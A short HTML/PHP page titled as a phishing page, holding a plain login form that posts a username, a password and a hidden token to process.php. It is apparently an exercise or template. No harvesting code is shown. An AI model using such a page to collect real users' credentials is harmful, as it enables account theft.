<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phising page</title>
    <?php include 'header.inc' ?>
</head>
<body>
    <form method="post" action="process.php">
        <label for="username">Username: </label>
        <input type="text" name="username" required>
        <br>
        
        <label for="password">Password: </label>
        <input type="password" name="password" required>
        <br>
        <input type="hidden" name="token" value="S106209751">
        <input type="submit" value="Login">
    </form>
</body>
<?php include 'footer.inc' ?>
</html>